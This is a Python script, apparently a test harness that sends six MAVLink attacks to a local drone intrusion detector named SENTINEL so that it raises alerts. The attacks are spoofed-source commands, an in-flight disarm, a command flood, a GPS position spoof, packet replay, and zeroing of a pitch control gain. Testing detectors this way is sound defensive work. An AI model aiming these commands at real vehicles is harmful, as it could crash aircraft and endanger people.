from pymavlink import mavutil
import time

print("=" * 55)
print("  SENTINEL Attack Injection Script")
print("  Sends attacks directly to SENTINEL on port 14550")
print("=" * 55)
print()

# Send directly to SENTINEL's listening port
# udpout sends TO the address, not FROM it
print("[*] Connecting attacker (sysid=99) to port 14550...")
conn = mavutil.mavlink_connection(
    'udpout:127.0.0.1:14550',
    source_system=99
)
print("[*] Attacker connected as sysid 99")
print()

print("[*] Waiting 35 seconds for SENTINEL learning phase...")
for i in range(35, 0, -1):
    print(f"\r[*] Starting attacks in {i}s...", end='', flush=True)
    time.sleep(1)
print("\n")

# Attack 1 — Unknown Source
print("[INJECT] Attack 1: UNKNOWN SOURCE")
conn.mav.command_long_send(
    1, 1, 246, 0, 1, 0, 0, 0, 0, 0, 0
)
print("[INJECT] Sent command from sysid 99")
time.sleep(3)

# Attack 2 — Inflight DISARM
print("[INJECT] Attack 2: INFLIGHT DISARM")
conn.mav.command_long_send(
    1, 1, 400, 0, 0.0, 0, 0, 0, 0, 0, 0
)
print("[INJECT] Sent DISARM command")
time.sleep(3)

# Attack 3 — Command Flood
print("[INJECT] Attack 3: COMMAND FLOOD")
print("[INJECT] Sending 50 commands rapidly...")
for i in range(50):
    conn.mav.command_long_send(
        1, 1, 246, i, 1, 0, 0, 0, 0, 0, 0
    )
    time.sleep(0.04)
print("[INJECT] Flood complete")
time.sleep(3)

# Attack 4 — GPS Teleport
print("[INJECT] Attack 4: GPS TELEPORT")
boot_ms = int(time.time() * 1000) % 4294967295
conn.mav.global_position_int_send(
    boot_ms,
    int(19.0760 * 1e7),
    int(72.8777 * 1e7),
    1000, 1000, 0, 0, 0, 0
)
print("[INJECT] Teleported from Canberra to Mumbai")
time.sleep(3)

# Attack 5 — Replay Attack
print("[INJECT] Attack 5: REPLAY ATTACK")
for i in range(3):
    conn.mav.command_long_send(
        1, 1, 246, 42, 1, 0, 0, 0, 0, 0, 0
    )
    print(f"[INJECT] Replayed packet {i+1}/3")
    time.sleep(1)
time.sleep(2)

# Attack 6 — Parameter Manipulation
print("[INJECT] Attack 6: PARAMETER MANIPULATION")
conn.mav.param_set_send(
    1, 1,
    b'ATC_ANG_PIT_P',
    0.0,
    mavutil.mavlink.MAV_PARAM_TYPE_REAL32
)
print("[INJECT] PARAM_SET sent from sysid 99")
time.sleep(2)

print()
print("=" * 55)
print("  All 6 attacks injected.")
print("  Check SENTINEL terminal for alerts.")
print("=" * 55)
